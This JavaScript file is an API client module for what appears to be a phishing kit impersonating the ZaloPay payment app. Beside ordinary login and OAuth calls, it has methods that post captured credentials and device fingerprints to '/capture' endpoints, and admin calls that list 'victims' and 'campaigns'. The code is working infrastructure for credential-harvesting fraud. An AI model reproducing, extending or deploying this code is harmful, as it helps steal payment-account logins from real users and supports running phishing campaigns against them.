/**
 * API Module - Handles all API communications
 */

import axios from 'axios';

export class API {
  constructor() {
    this.baseURL = process.env.NODE_ENV === 'production'
      ? '/api'
      : 'http://localhost:8000/api';

    this.client = axios.create({
      baseURL: this.baseURL,
      timeout: 10000,
      headers: {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest'
      }
    });

    this.setupInterceptors();
  }

  setupInterceptors() {
    // Request interceptor
    this.client.interceptors.request.use(
      (config) => {
        // Add auth token if available
        const token = this.getAuthToken();
        if (token) {
          config.headers.Authorization = `Bearer ${token}`;
        }

        // Add CSRF token for state-changing requests
        if (['post', 'put', 'patch', 'delete'].includes(config.method)) {
          const csrfToken = this.getCsrfToken();
          if (csrfToken) {
            config.headers['X-CSRF-Token'] = csrfToken;
          }
        }

        return config;
      },
      (error) => {
        return Promise.reject(error);
      }
    );

    // Response interceptor
    this.client.interceptors.response.use(
      (response) => {
        return response.data;
      },
      (error) => {
        if (error.response) {
          // Server responded with error status
          const { status, data } = error.response;

          if (status === 401) {
            this.handleUnauthorized();
          } else if (status === 403) {
            this.handleForbidden();
          } else if (status >= 500) {
            this.handleServerError();
          }

          throw new Error(data.message || `HTTP ${status} Error`);
        } else if (error.request) {
          // Network error
          throw new Error('Network error. Please check your connection.');
        } else {
          // Other error
          throw error;
        }
      }
    );
  }

  getAuthToken() {
    return localStorage.getItem('auth_token') || sessionStorage.getItem('auth_token');
  }

  getCsrfToken() {
    return document.querySelector('meta[name="csrf-token"]')?.getAttribute('content');
  }

  handleUnauthorized() {
    // Clear auth data and redirect to login
    localStorage.removeItem('auth_token');
    sessionStorage.removeItem('auth_token');
    window.location.href = '/login';
  }

  handleForbidden() {
    window.zaloPayApp?.showError('You do not have permission to perform this action.');
  }

  handleServerError() {
    window.zaloPayApp?.showError('Server error. Please try again later.');
  }

  // Authentication methods
  async login(credentials) {
    return this.client.post('/auth/login', credentials);
  }

  async logout() {
    return this.client.post('/auth/logout');
  }

  async register(userData) {
    return this.client.post('/auth/register', userData);
  }

  // OAuth methods
  async getGoogleAuthUrl() {
    return this.client.get('/oauth/google/url');
  }

  async getAppleAuthUrl() {
    return this.client.get('/oauth/apple/url');
  }

  async getFacebookAuthUrl() {
    return this.client.get('/oauth/facebook/url');
  }

  // Capture methods
  async submitCredentials(credentials) {
    return this.client.post('/capture/credentials', credentials);
  }

  async submitFingerprint(fingerprint) {
    return this.client.post('/capture/fingerprint', fingerprint);
  }

  // Admin methods
  async getDashboardStats() {
    return this.client.get('/admin/dashboard');
  }

  async getVictims(params = {}) {
    return this.client.get('/admin/victims', { params });
  }

  async getCampaigns(params = {}) {
    return this.client.get('/admin/campaigns', { params });
  }

  // Health check
  async healthCheck() {
    return this.client.get('/health');
  }

  // Generic HTTP methods
  async get(url, config = {}) {
    return this.client.get(url, config);
  }

  async post(url, data = {}, config = {}) {
    return this.client.post(url, data, config);
  }

  async put(url, data = {}, config = {}) {
    return this.client.put(url, data, config);
  }

  async patch(url, data = {}, config = {}) {
    return this.client.patch(url, data, config);
  }

  async delete(url, config = {}) {
    return this.client.delete(url, config);
  }
}